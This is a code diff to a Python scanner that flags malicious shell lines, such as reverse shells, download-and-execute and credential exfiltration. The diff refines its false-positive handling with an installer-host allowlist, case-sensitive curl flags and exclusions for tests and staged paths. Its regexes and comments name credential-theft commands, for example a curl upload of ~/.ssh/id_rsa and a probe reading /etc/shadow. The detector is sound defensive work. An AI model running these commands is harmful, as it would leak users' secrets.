@@ -35,6 +35,56 @@ _WEIGHTS = {
     "enumeration": 1,
 }
 
+_INSTALL_HOST_RE = re.compile(r"https?://([A-Za-z0-9.\-]+)", re.I)
+
+# Hosts whose `curl <host> | sh` is a documented, official bootstrap rather than a
+# dropper. This is the ONE list; the manifest scanner and the Tier-2 fetch gate both
+# import it from here. It used to be duplicated as a short inline alternation inside
+# the curl-pipe-shell regex, and the two copies drifted: the 2026-07-21 hunt
+# confirmed photoprism (claude.ai), cyotee/crane (release.anza.xyz) and
+# adityavanjre/project-k (ollama.com) purely because those hosts were reputable to
+# one copy and unknown to the other.
+_REPUTABLE_INSTALL_HOSTS = (
+    "install.meteor.com", "sh.rustup.rs", "rustup.rs", "static.rust-lang.org",
+    "deb.nodesource.com", "get.docker.com", "download.docker.com", "bun.sh",
+    "astral.sh", "deno.land", "install.python-poetry.org", "get.pnpm.io",
+    "apt.llvm.org", "get.helm.sh", "packages.microsoft.com", "cli.github.com",
+    "nodejs.org", "python.org",
+    # OS package mirrors: a Dockerfile pulling from the distro is a build step.
+    "deb.debian.org", "archive.ubuntu.com", "security.ubuntu.com", "dl-cdn.alpinelinux.org",
+    # Package registries: pulling a passive artifact from one is a build step, not a
+    # dropper (the fa0311/twitter-openapi folderOpen venv+pip+curl-maven-jar FP,
+    # 2026-07-07). Attacker C2s (e.g. *.vercel.app droppers) are NOT here, so a
+    # curl|bash to one still confirms.
+    "repo1.maven.org", "repo.maven.apache.org", "registry.npmjs.org",
+    "pypi.org", "files.pythonhosted.org", "crates.io", "static.crates.io",
+    "proxy.golang.org", "rubygems.org",
+    # Named-toolchain installers that publish an official `curl <host> | sh` (same
+    # shape as rustup): Foundry (Ethereum), Homebrew, Starship, Volta, nvm, Semgrep.
+    "foundry.paradigm.xyz", "raw.githubusercontent.com/foundry-rs", "get.brew.sh",
+    "starship.rs", "get.volta.sh", "raw.githubusercontent.com/nvm-sh", "semgrep.dev",
+    # Vendor installers seen in the 2026-07-21 false-positive batch.
+    "claude.ai", "ollama.com", "release.anza.xyz", "get.k3s.io", "sdk.cloud.google.com",
+    "packages.cloud.google.com", "aka.ms", "dl.google.com", "storage.googleapis.com",
+    "uv.astral.sh", "mise.run", "get.sdkman.io", "install.determinate.systems",
+    "nixos.org", "tailscale.com", "get.nextflow.io", "micro.mamba.pm",
+)
+
+
+def is_reputable_install_host(host: str) -> bool:
+    """True if ``host`` is a known toolchain-installer / package-registry host, so a
+    ``curl <host> | sh`` is a normal bootstrap rather than a dropper. Shared with the
+    manifest scanner and the Tier-2 fetch-target gate so every layer agrees."""
+    h = (host or "").lower().rstrip(".")
+    return any(h == r or h.endswith("." + r) for r in _REPUTABLE_INSTALL_HOSTS)
+
+
+def _all_hosts_reputable(line: str) -> bool:
+    """True if the line has URL hosts and every one of them is a reputable installer."""
+    hosts = [h.lower().rstrip(".") for h in _INSTALL_HOST_RE.findall(line or "")]
+    return bool(hosts) and all(is_reputable_install_host(h) for h in hosts)
+
+
 # Category -> (rule name, regex). Case-insensitive, matched per line.
 _RULES: dict[str, list[tuple[str, re.Pattern]]] = {
     "reverse_shell": [
@@ -53,15 +103,11 @@ _RULES: dict[str, list[tuple[str, re.Pattern]]] = {
     "download_exec": [
         # curl|bash is dangerous from an ATTACKER host, but it is ALSO the standard
         # install idiom for reputable toolchains (`curl -fsSL deb.nodesource.com/...
-        # | bash` in a Dockerfile). The negative lookahead excludes a pipe-to-shell
-        # whose fetch targets a well-known installer host, so a normal Docker build
-        # no longer confirms as download-and-execute (2026-07-06 docker FP audit).
+        # | bash` in a Dockerfile). The reputable-host exclusion is NOT inlined here
+        # any more: it lives in `_REPUTABLE_INSTALL_HOSTS` and is applied by
+        # `_is_false_positive`, so there is one list instead of two that drift
+        # (2026-07-21 photoprism / crane / project-k FPs).
         ("curl-pipe-shell", re.compile(
-            r"(?!(?:curl|wget)\b[^\n|]*\b(?:deb\.nodesource\.com|deb\.debian\.org|"
-            r"archive\.ubuntu\.com|security\.ubuntu\.com|get\.docker\.com|"
-            r"download\.docker\.com|sh\.rustup\.rs|rustup\.rs|get\.helm\.sh|"
-            r"apt\.llvm\.org|packages\.microsoft\.com|bun\.sh|astral\.sh|"
-            r"install\.python-poetry\.org)\b)"
             # `python -m json.tool` / `-m http.server` READ stdin as data (pretty-print
             # / serve); they never execute the fetched bytes, so `curl ... | python -m
             # json.tool` is not download-and-run (the localhost/API health-check FPs,
@@ -78,8 +124,17 @@ _RULES: dict[str, list[tuple[str, re.Pattern]]] = {
         ("telegram-bot", re.compile(r"api\.telegram\.org/bot", re.I)),
         # curl/wget POSTING or UPLOADING a secret FILE is credential exfil (the
         # data is the tell, not the host): `curl -d @~/.ssh/id_rsa http://x`.
+        # The upload flags MUST be case-sensitive, exactly as in curl-post-data below.
+        # Under a blanket re.I, `-F` (form-upload) also matched curl's ubiquitous
+        # benign `-f` ("fail silently"), so a plain DOWNLOAD of a template file --
+        # `curl -fsSL "$RAW_BASE/.env.example" -o "$dir/.env.example"` -- confirmed as
+        # credential exfiltration. That single collision produced the highest-scoring
+        # false positive of the 2026-07-21 hunt (adityavanjre/project-k, score 90).
+        # `-o`/`--output` is also excluded outright: it writes the response to disk,
+        # which is a fetch, the opposite direction from exfil.
         ("secret-exfil", re.compile(
-            r"\b(?:curl|wget)\b[^\n]*(?:-d|--data(?:-binary)?|-F|--form|-T|--upload-file)"
+            r"\b(?:curl|wget)\b(?![^\n]*(?-i:\s-o\b|\s--output\b))"
+            r"[^\n]*(?:(?-i:\s-d\b|\s-F\b|\s-T\b)|--data(?:-binary)?\b|--form\b|--upload-file\b)"
             r"[^\n]*(?:id_rsa|id_ed25519|\.ssh/|\.aws/credentials|/etc/shadow|/etc/passwd|"
             r"\.env\b|credentials?\.(?:json|ya?ml)|secrets?\.(?:json|ya?ml|txt))", re.I)),
         # The exfil flags are case-SENSITIVE: -d (data), -F (form), -T (upload).
@@ -195,7 +250,11 @@ _IGNORE_DIRS = frozenset({
 })
 # Directory-name SUFFIXES that mark a test tree even when hyphenated/prefixed
 # (netbsd-tests, atf-tests, kyua-tests, lib-tests, ...).
-_TEST_DIR_SUFFIXES = ("-tests", "_tests", "-test", "_test")
+# End-to-end harnesses hold scripted attack commands as test INPUT: the
+# antoroute/openclawsecure FP (2026-07-21) confirmed on a driver that printf'd
+# "Run exactly this shell command...: cat /etc/shadow > %s" as a probe string.
+_TEST_DIR_SUFFIXES = ("-tests", "_tests", "-test", "_test", "-e2e", "_e2e")
+_TEST_DIR_EXACT = frozenset({"e2e", "testdata", "test-data", "golden"})
 # Test-file name markers (a test file can live anywhere, e.g. `src/x.test.ts`).
 _TEST_FILE_MARKERS = (".test.", ".spec.", ".stories.", ".fixture.", ".mock.")
 # Language-specific test-file conventions matched by SUFFIX/PREFIX (not loose
@@ -256,8 +315,8 @@ def is_ignored_path(path: Path) -> bool:
     parts = {p.lower() for p in path.parts}
     if _IGNORE_DIRS & parts:
         return True
-    # hyphenated/prefixed test trees (netbsd-tests, atf-tests, ...)
-    if any(p.endswith(_TEST_DIR_SUFFIXES) for p in parts):
+    # hyphenated/prefixed test trees (netbsd-tests, atf-tests, live-connector-e2e, ...)
+    if _TEST_DIR_EXACT & parts or any(p.endswith(_TEST_DIR_SUFFIXES) for p in parts):
         return True
     name = path.name.lower()
     if is_test_file(name):
@@ -284,13 +343,51 @@ def is_bash_bearing(path: Path, first_line: str) -> bool:
     return bool(_SHEBANG.match(first_line))
 
 
+# A line that DEFINES a detection pattern is a detector doing its job, not an
+# attack. `regexp.MustCompile("(?i)webhook\.site")` inside a security gateway's
+# rule table is a signature, the same way a YARA rule file is. Matching it made
+# git_warden confirm a defensive product as malware (antoroute/openclawsecure,
+# 2026-07-21), which is the file-level `is_security_data_file` idea applied per line
+# for tools that keep their rules inline in source rather than in a rules file.
+_PATTERN_DEF = re.compile(
+    r"regexp\.MustCompile|regexp\.Compile|re\.compile|re\.MustCompile|"
+    r"new\s+RegExp|Pattern\.compile|Regex\.new|preg_match|RegexBuilder",
+    re.I)
+
+# `/etc/shadow` under a variable or staged prefix (`"$tmp"/etc/shadow`,
+# `${DESTDIR}/etc/shadow`, `$ROOTFS/etc/shadow`) is a path INSIDE an image being
+# built, not the running host's password file. Distro tooling edits it constantly:
+# `sed -i -e 's/^root::/root:*:/' "$tmp"/etc/shadow` in Alpine's own aports tree
+# confirmed as credential harvesting on the 2026-07-21 hunt.
+_STAGED_SHADOW = re.compile(r"(?:\$\{?\w+\}?|\"\$\{?\w+\}?\")/+etc/shadow")
+# `sed -i` / `install -m` WRITE to the file; harvesting requires reading it out.
+_SHADOW_WRITE = re.compile(r"\bsed\b[^\n]*\s-i\b|\binstall\b[^\n]*\s-m\b|\bchpasswd\b", re.I)
+
+
+def is_benign_construct(rule: str, line: str) -> bool:
+    """True if a matched rule is a known-benign construct and must not be recorded.
+
+    Centralised here rather than bolted onto each regex: a negative lookahead inside
+    an already dense pattern is where the duplicated-allowlist and case-folding bugs
+    came from. Each branch cites the false positive that motivated it. Shared with
+    the content scanner so a detector's inline rule table is neutral in both.
+    """
+    if _PATTERN_DEF.search(line):
+        return True
+    if rule == "curl-pipe-shell":
+        return _all_hosts_reputable(line)
+    if rule == "shadow-read":
+        return bool(_STAGED_SHADOW.search(line) or _SHADOW_WRITE.search(line))
+    return False
+
+
 def scan_text(text: str, file: str = "<text>") -> list[BashFinding]:
     """Run every rule against each line of text. Pure."""
     findings: list[BashFinding] = []
     for lineno, line in enumerate(text.splitlines(), 1):
         for category, rules in _RULES.items():
             for rule_name, pattern in rules:
-                if pattern.search(line):
+                if pattern.search(line) and not is_benign_construct(rule_name, line):
                     findings.append(
                         BashFinding(file, lineno, category, rule_name, line.strip()[:200])
                     )
